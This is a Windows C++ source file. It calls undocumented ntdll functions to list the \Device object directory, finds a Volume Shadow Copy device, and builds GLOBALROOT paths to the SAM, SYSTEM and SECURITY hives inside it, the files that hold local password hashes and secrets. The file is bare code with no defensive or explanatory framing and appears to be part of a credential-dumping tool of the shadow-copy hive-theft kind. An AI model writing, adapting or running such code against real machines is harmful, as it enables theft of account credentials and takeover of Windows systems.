#include <Windows.h>
#include <stdio.h>
#include "structs.h"
//https://stackoverflow.com/questions/2643084/sysinternals-winobj-device-listing-mechanism

using _NtOpenDirectoryObject = NTSTATUS(NTAPI*)(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
using _NtQueryDirectoryObject = NTSTATUS(NTAPI*)(_In_      HANDLE  DirectoryHandle, _Out_opt_ PVOID   Buffer, _In_ ULONG Length, _In_ BOOLEAN ReturnSingleEntry, _In_  BOOLEAN RestartScan, _Inout_   PULONG  Context, _Out_opt_ PULONG  ReturnLength);
Data Find() {
	Data data;
	_NtQueryDirectoryObject NtQueryDirectoryObject = (_NtQueryDirectoryObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryDirectoryObject");
	_NtOpenDirectoryObject NtOpenDirectoryObect = (_NtOpenDirectoryObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenDirectoryObject");
	HANDLE dirobject;
	OBJECT_ATTRIBUTES obj;
	const wchar_t device[] = L"\\Device";
	UNICODE_STRING unicode_string = { 0 };
	unicode_string.Length = wcslen(device) * 2;
	unicode_string.MaximumLength = wcslen(device) * 2 + 2;
	unicode_string.Buffer = (PWSTR)device;
	InitializeObjectAttributes(&obj, &unicode_string, 0, 0, 00);

	NTSTATUS result = NtOpenDirectoryObect(&dirobject, 0x0001 | 0x0002, &obj);
	if (result == 0) {

		BYTE* buffer = new BYTE[100000];
		ULONG start = 0, index = 0, bytes;
		BOOLEAN restart = TRUE;
		for (;;)
		{
			result = NtQueryDirectoryObject(dirobject, PBYTE(buffer), 100000, FALSE, restart, &index, &bytes);
			if (result == 0)
			{
				POBJECT_DIRECTORY_INFORMATION const objectlist = reinterpret_cast<POBJECT_DIRECTORY_INFORMATION>(PBYTE(buffer));
				for (ULONG i = 0; i < index - start; i++)
				{
					if (0 == wcsncmp(objectlist[i].TypeName.Buffer, L"Device", objectlist[i].TypeName.Length / sizeof(WCHAR)))
					{
						if (wcsstr(objectlist[i].Name.Buffer, L"ShadowCopy")) {
							printf("Found VSS: %ws\n", objectlist[i].Name.Buffer);
							swprintf(data.sam_hive, 200, L"\\\\?\\GLOBALROOT\\Device\\%s\\windows\\system32\\config\\sam", objectlist[i].Name.Buffer);
							swprintf(data.system_hive, 200, L"\\\\?\\GLOBALROOT\\Device\\%s\\windows\\system32\\config\\system", objectlist[i].Name.Buffer);
							swprintf(data.security_hive, 200, L"\\\\?\\GLOBALROOT\\Device\\%s\\windows\\system32\\config\\security", objectlist[i].Name.Buffer);

							delete[] buffer;
							return data;

						}
					}
				}
			}
			if (STATUS_MORE_ENTRIES == result)
			{
				start = index;
				restart = FALSE;
				continue;
			}
			if ((result == 0) || (STATUS_NO_MORE_ENTRIES == result))
			{
				printf("Cant find VSS!\n");
				exit(0);

			}
		}

		return data;
	}
}